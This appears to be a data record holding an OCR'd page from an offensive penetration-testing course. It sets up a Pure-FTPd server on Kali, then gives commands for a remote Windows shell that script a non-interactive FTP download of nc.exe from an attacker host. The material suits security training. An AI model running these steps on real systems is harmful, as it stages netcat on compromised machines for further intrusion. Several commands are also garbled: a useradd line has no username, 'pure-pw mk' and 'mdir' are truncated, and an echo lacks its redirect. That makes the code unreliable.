- img_proc: true
  md: '# OFFENSIVE Security Penetration Testing with Kali Linux


    Before any clients connect to our FTP server, we first need to create a new user
    for PureFtp. The following Bash script will automate the user creation for us:


    ```

    #!/bin/bash


    groupadd ftpgroup

    useradd -g ftpgroup -d /dev/null -s /ftphome

    pure-pw useradd offsec -u ftpuser -d /ftphome

    pure-pw mk

    cd /etc/pure-ftpd/auth/

    ln -s ../conf/PureDB 60pdb

    mdir -p /ftphome

    chown -R ftpuser:ftpgroup /ftphome/

    /etc/init.d/pure-ftpd restart

    ```


    We then run the script and provide a password for the offsec when prompted:


    ```

    root@kali:~# chmod 755 setup-ftp

    root@kali:~# ./setup-ftp

    Password:

    Enter it again:

    Restarting ftp server

    ```


    With our FTP server configured, we can now paste the following commands into a
    remote Windows shell and download files over FTP non-interactively.


    ```

    C:\Users\offsec>echo open 192.168.10.5 21 ftp.txt

    C:\Users\offsec>echo ftp >> ftp.txt

    C:\Users\offsec>echo ftp >> ftp.txt

    C:\Users\offsec>echo bin >> ftp.txt

    C:\Users\offsec>echo get nc.exe >> ftp.txt

    C:\Users\offsec>echo bye >> ftp.txt

    C:\Users\offsec>ftp -s:ftp.txt

    ```


